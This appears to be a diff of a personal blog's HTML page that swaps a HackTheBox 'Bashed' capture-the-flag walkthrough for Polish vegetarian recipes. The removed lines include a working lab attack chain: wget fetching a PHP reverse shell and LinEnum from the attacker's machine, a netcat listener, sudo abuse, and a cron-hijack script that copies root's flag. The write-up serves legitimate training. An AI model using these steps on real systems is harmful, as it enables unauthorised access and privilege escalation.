@@ -13,7 +13,7 @@
 <head>
 <meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
-<title>Hackthebox</title>
+<title>Food [pl]</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <meta name="description" content="">
 <link rel="shortcut icon" href="/" type="">
@@ -66,107 +66,54 @@
 
 
             <article class="uk-article" itemtype="http://schema.org/BlogPosting" itemscope="itemscope" itemprop="blogPost">
-                <a href="/bashed.html" class="uk-article-title uk-link-muted" itemprop="name">Bashed</a>
-                <p class="uk-article-meta"><time datetime="2020-01-13" itemprop="datePublished">pon 13 stycznia 2020</time> • <a href="/category/hackthebox.html">HackTheBox</a></p>
+                <a href="/ultimate-pasztet-grzybowy-ze-slonecznika.html" class="uk-article-title uk-link-muted" itemprop="name">Ultimate pasztet grzybowy ze słonecznika</a>
+                <p class="uk-article-meta"><time datetime="2018-10-07" itemprop="datePublished">nie 07 października 2018</time> • <a href="/category/food-pl.html">Food [PL]</a></p>
 </p>
-                <p class="uk-article-lead" itemprop="description">Solution to the Bashed VM</p>
-                <section itemprop="articleBody"><h1>User flag</h1>
-<p>It is not really necessary to start this one with <strong>nmap</strong>, but it's never a bad first step</p>
-<div class="highlight"><pre><span></span>root@kali:~# nmap -sS -Pn -sV <span class="m">10</span>.10.10.68
-</pre></div>
-
-
-<div class="highlight"><pre><span></span>Starting Nmap 7.70 ( https://nmap.org ) at 2020-01-13 13:20 CET
-Nmap scan report for 10.10.10.68
-Host is up (0.11s latency).
-Not shown: 999 closed ports
-PORT   STATE SERVICE VERSION
-80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 10.24 seconds
-</pre></div>
-
-
-<p>As we can see, only port 80 is opened. After opening it in web browser, there is a unfinished, but already launched website. We can dig a bit through it, just to learn that it is connected to a <strong>phpbash</strong> project. That's nice, but we want to speed things up.</p>
-<p>We can run several tools to look for cool and useful, but hidden urls. My first choice here is DirBuster.
-It takes him a few minutes to find the thing we need:</p>
-<div class="highlight"><pre><span></span>http://10.10.10.68/dev/phpbash.php
-</pre></div>
-
-
-<p>After opening that link we know that we are in the right place. It's an online bash terminal. So wy not to try to look for the first flag?</p>
-<div class="highlight"><pre><span></span>$ ls /user
-$ cat /home/arrexel/user.txt
-</pre></div>
-
-
-<p>Yup, we got it!</p>
-<h1>Root flag</h1>
-<p><em>phpbash</em> is nice, but doesn't provide a full terminal experience. A reverse shell is wat we need.</p>
-<p>Firstly we need a place in the /var/www/html path to store it. Only the <strong>upload</strong> dir will do, but we need nothing more. Except of course of a php reverse shell with out IP in it's config. I've already got it on my Kali VM, served by an apache instance, so it's easy:</p>
-<div class="highlight"><pre><span></span>www-data:/var/www/html/uploads# wget <span class="m">10</span>.10.14.16/shell.php
-</pre></div>
-
-
-<p>Now I can open netcat on my Kali, and load 10.10.10.68/upload/shell.php in my web browser.</p>
-<div class="highlight"><pre><span></span>root@kali:/var/www/html# nc -v -n -l -p <span class="m">1234</span>
-</pre></div>
-
-
-<p>It works, so now the same thing in <em>/tmp</em> dir <em>LinEnum</em></p>
-<div class="highlight"><pre><span></span><span class="nb">cd</span> /tmp
-wget <span class="m">10</span>.10.14.16/LinEnum.sh
-bash ./LinEnum.sh
-</pre></div>
-
-
-<p>We can see good stuff in it's output!</p>
-<div class="highlight"><pre><span></span>[+] We can sudo without supplying a password!
-Matching Defaults entries for www-data on bashed:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User www-data may run the following commands on bashed:
-    (scriptmanager : scriptmanager) NOPASSWD: ALL
-</pre></div>
-
-
-<p>We knew about this user already from listing the home directory. Now we can sudo it.</p>
-<div class="highlight"><pre><span></span>$ sudo -u scriptmanager bash
-</pre></div>
-
-
-<p>Works. What next? We need something to find a point for privilege escalation. <strong>pspy</strong> will help us with it.</p>
-<div class="highlight"><pre><span></span>./pspy64
-</pre></div>
-
-
-<div class="highlight"><pre><span></span><span class="nt">2020</span><span class="o">/</span><span class="nt">01</span><span class="o">/</span><span class="nt">13</span> <span class="nt">05</span><span class="p">:</span><span class="nd">46</span><span class="p">:</span><span class="nd">01</span> <span class="nt">CMD</span><span class="o">:</span> <span class="nt">UID</span><span class="o">=</span><span class="nt">0</span>    <span class="nt">PID</span><span class="o">=</span><span class="nt">2297</span>   <span class="o">|</span> <span class="nt">python</span> <span class="nt">test</span><span class="p">.</span><span class="nc">py</span>
-<span class="nt">2020</span><span class="o">/</span><span class="nt">01</span><span class="o">/</span><span class="nt">13</span> <span class="nt">05</span><span class="p">:</span><span class="nd">46</span><span class="p">:</span><span class="nd">01</span> <span class="nt">CMD</span><span class="o">:</span> <span class="nt">UID</span><span class="o">=</span><span class="nt">0</span>    <span class="nt">PID</span><span class="o">=</span><span class="nt">2296</span>   <span class="o">|</span> <span class="o">/</span><span class="nt">bin</span><span class="o">/</span><span class="nt">sh</span> <span class="nt">-c</span> <span class="nt">cd</span> <span class="o">/</span><span class="nt">scripts</span><span class="o">;</span> <span class="nt">for</span> <span class="nt">f</span> <span class="nt">in</span> <span class="o">*</span><span class="p">.</span><span class="nc">py</span><span class="o">;</span> <span class="nt">do</span> <span class="nt">python</span> <span class="s2">&quot;$f&quot;</span><span class="o">;</span> <span class="nt">done</span>
-</pre></div>
-
-
-<p>Nice, we can see, that <strong>/scrips</strong> dir is owned by <strong>scriptmanager</strong>!</p>
-<p>Now we need a tiny root.txt stealing python script. It doesn't need to be fancy.</p>
-<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">shutil</span>
-<span class="kn">import</span> <span class="nn">os</span>
-<span class="n">shutil</span><span class="o">.</span><span class="n">copy</span><span class="p">(</span><span class="s2">&quot;/root/root.txt&quot;</span><span class="p">,</span> <span class="s2">&quot;/tmp/root.txt&quot;</span><span class="p">)</span>
-<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;chmod 777 /tmp/root.txt&quot;</span><span class="p">)</span>
-</pre></div>
-
-
-<p>As in every step, I've served it on my Kali apache, so:</p>
-<div class="highlight"><pre><span></span>$ wget <span class="m">10</span>.10.14.16/bashed/run.py
-
-sudo -u scriptmanager cp run.py /scripts
-$ cat /tmp/root.txt
-</pre></div>
-
-
-<p>IT'S ROOTED. It was not difficult but fun!</p></section>
-                <a href="/bashed.html#disqus_thread"></a>
+                <p class="uk-article-lead" itemprop="description">Chciałem zacząć ten wpis od akapitu o karmieniu pasztetem papieża, ale za kilka dni święta, więc sobie daruję, bo szkoda pominąć istotniejszy, choć mniej śmieszny kontekst. Rzecz jest prosta: grzybowy pasztet ze słonecznika to jest ultimate paszetet, taki który możecie wrzucić do święconego koszyczka na wielkanoc i który będzie wchodził …</p>
+                <section itemprop="articleBody"><p>Chciałem zacząć ten wpis od akapitu o karmieniu pasztetem papieża, ale za kilka dni święta, więc sobie daruję, bo szkoda pominąć istotniejszy, choć mniej śmieszny kontekst. Rzecz jest prosta: grzybowy pasztet ze słonecznika to jest ultimate paszetet, taki który możecie wrzucić do święconego koszyczka na wielkanoc i który będzie wchodził w Boże narodzenie jak złoto. Niekoniecznie w czasie wieczerzy, bo to smarowidło do chleba, ale jako zerowanie kubków smakowych po słodkim albo na śniadanie to po prostu bajka. W następnych dwóch akapitach będę obrażał pasztet z mięsa, przy okazji tłumacząc dlaczego mój jest lepszy. Możecie wykorzystać te argumenty w dyskusji przy wigilijnym stole. </p>
+<p>Mamy tu do czynienia z ideałem. Nie z jakimś pasztetem ze świni ujebanej gównem, tylko eleganckim wyrobem z dojrzewających w polskim słońcu nasion słonecznika, symbolu szczęścia i miłości, z aromatycznej cebuli, symbolu kuchni nie tylko polskej, ale też francuskiej oraz z najszlachetniejszych grzybów ze śląskich lasów: borowików albo podgrzybków, które śmiało można nazwać jedną z największych tajemnic kuchni europejskiej, skarbu dziczy o rozlicznych wartościach odżyczych, których bogactwa do tej pory nie pojęto w całości. Powtarzam, żeby było to jasne, w tym papieskim pasztecie żaden ze składników nie ma odbytu ani szczeciny, nie ma tu -- przepraszam za dosadność -- smaku chlewa i gówna.</p>
+<p>Co więcej, poza brakiem wspomaniego aromatu świni albo kury, który -- umówmy się -- nie jest wartością dodaną, nie brak mu niczego. Jest tłusty, ma białeczko, umami, wędzony aromat i odpowiednią smarowność. Po przejściu na wegetarianizm początkowo bardzo mi właśnie pasztetu, zwłaszcza że wszelkie pasty ze strączków, nawet te najsmaczniejsze, dawały rezultat znacząco inny od tego, który mogłem kupić w mięsnym za 20zł/kg. Dopiero ten przepis sprawił, że z pełną pogardą mogę patrzeć na mieloną świnię. Słowo daję, możecie podsunąć kanapkę z nim nie tylko głowie Kościoła, gdyby akurat was odwiedziła, ale też znajomym przy wódeczce, pewnie nawet nie zauważą różnicy, tylko powiedzą, że dobre i że chcą jeszcze. Tak będzie, nie zmyślam.</p>
+<h2>Przepis</h2>
+<h3>Składniki</h3>
+<ul>
+<li>Grzyby. Najlepiej leśne: borowiki, podgrzybki, maślaki, ale boczniaki też się świetnie nadadzą, pieczarki też. Ile? Ile chcecie, ze dwie-trzy garście pokrojonych w moim przypadku</li>
+<li>Cebula, jedna duża, można dorzucić ekstra szalotkę</li>
+<li>Kawałek pora, tak z 5cm</li>
+<li>Ziele angielskie, 2 sztuki</li>
+<li>Jałowiec, 2 sztuki</li>
+<li>Słonecznik łuskany, ok 1 szklanki</li>
+<li>Sos sojowy</li>
+<li>Sól</li>
+<li>Pieprz</li>
+<li>Majeranek</li>
+<li>Cząber</li>
+<li>Lubczyk</li>
+<li>Wędzona papryka</li>
+</ul>
+<h3>How To</h3>
+<p>Smażymy na oleju grzyby, cebulę i pora wraz z jałowcem i zielem angielski. </p>
+<p><img alt="Surowe rzeczy na patelni, zdjęcie poglądowe" src="/images/2-pasztet/pasztet1.jpg">
+Surowe rzeczy na patelni, zdjęcie poglądowe</p>
+<p>Niech to trochę potrwa, żeby grzyby nie były surowe, nie chcę, żebyście przeze mnie umarli. Wyciągamy zielę i jałowiec, nie chcemy tego zblendować, bo zepsują smak. Następnie dodajemy na chwilkę na patelnię słonecznik, po nim przyprawy w stosownej ilości (nie będę podawał, szanujmy się, każdy ma swój smak). Przekładamy całość do blendera i blendujemy na umiarkowanie gładką masę. Dodatek sosu sojowego to protip, bo łatwiej będzie zmielić całość i przy okazji ma sporo glutaminianu, więc fajnie.</p>
+<p><img alt="Post-surowe rzeczy na patelni, zdjęcie poglądowe" src="/images/2-pasztet/pasztet2.jpg">
+Post-surowe rzeczy na patelni, zdjęcie poglądowe</p>
+<p>Gotowy produkt wytrzymuje w lodówce lekko tydzień. Dodatek musztardy, keczupu i kiszonego ogóra to oczywistość, najlepiej wszystko na raz.</p>
+<p><img alt="Foodporn, zdjęcie poglądowe" src="/images/2-pasztet/pasztet3.jpg">
+Foodporn, zdjęcie poglądowe</p></section>
+                <a href="/ultimate-pasztet-grzybowy-ze-slonecznika.html#disqus_thread"></a>
                 <hr class="uk-article-divider">
             </article>
+
+
+        <article class="uk-article" itemtype="http://schema.org/BlogPosting" itemscope="itemscope" itemprop="blogPost">
+                <a href="/mleko-ryzowe-ale-takie-lepsze.html" class="uk-article-title uk-link-muted" itemprop="name">Mleko ryżowe, ale takie lepsze</a>
+                <p class="uk-article-meta"><time datetime="2017-03-04" itemprop="datePublished">sob 04 marca 2017</time> • <a href="/category/food-pl.html">Food [PL]</a></p>
+</p>
+                <p class="uk-article-lead" itemprop="description">Geneza Wszyscy kiedyś umrzemy, więc jeśli mamy zostawić jakieś dziedzictwo dla przyszłych pokoleń, może ras i gatunków, niech ten przepis będzie moim wkładem w wieczność. Piliście kiedyś mleko ryżowe ze sklepu? Moim zdaniem jest tak smaczne, że krowie może mu co najwyżej possać, ma jednak co najmnej jedną wadę. Tak …</p>
+                <p>Geneza Wszyscy kiedyś umrzemy, więc jeśli mamy zostawić jakieś dziedzictwo dla przyszłych pokoleń, może ras i gatunków, niech ten przepis będzie moim wkładem w wieczność. Piliście kiedyś mleko ryżowe ze sklepu? Moim zdaniem jest tak smaczne, że krowie może mu co najwyżej possać, ma jednak co najmnej jedną wadę. Tak, cenę, która wydaj się być niewspółmierna do składu. Garść ryżu i litr wody za 6-7zł? Krowa musiałaby pewnie wypić tego mleka kilka kartonów, żeby wyprodukować jeden litr...</p>
+                <a href="/mleko-ryzowe-ale-takie-lepsze.html">Read More</a>
+                <hr class="uk-article-divider">
+        </article>
 
 
 </div>
@@ -182,8 +129,8 @@ $ cat /tmp/root.txt
             <div class="uk-panel uk-panel-box">
                 <ul class="uk-nav uk-nav-side">
                     <li class="uk-nav-header">Categories</li>
-                    <li ><a href="/category/food-pl.html">Food [PL]</a></li>
-                    <li class="uk-active"><a href="/category/hackthebox.html">HackTheBox</a></li>
+                    <li class="uk-active"><a href="/category/food-pl.html">Food [PL]</a></li>
+                    <li ><a href="/category/hackthebox.html">HackTheBox</a></li>
                     <li ><a href="/category/python.html">Python</a></li>
                     <li ><a href="/category/snippets.html">Snippets</a></li>
                     <li class="uk-nav-header">Pages</li>
@@ -252,8 +199,8 @@ $ cat /tmp/root.txt
 
         <ul class="uk-nav uk-nav-offcanvas" data-uk-nav>
             <li class="uk-nav-header">Categories</li>
-            <li ><a href="/category/food-pl.html">Food [PL]</a></li>
-            <li class="uk-active"><a href="/category/hackthebox.html">HackTheBox</a></li>
+            <li class="uk-active"><a href="/category/food-pl.html">Food [PL]</a></li>
+            <li ><a href="/category/hackthebox.html">HackTheBox</a></li>
             <li ><a href="/category/python.html">Python</a></li>
             <li ><a href="/category/snippets.html">Snippets</a></li>
             <li class="uk-nav-header">Pages</li>
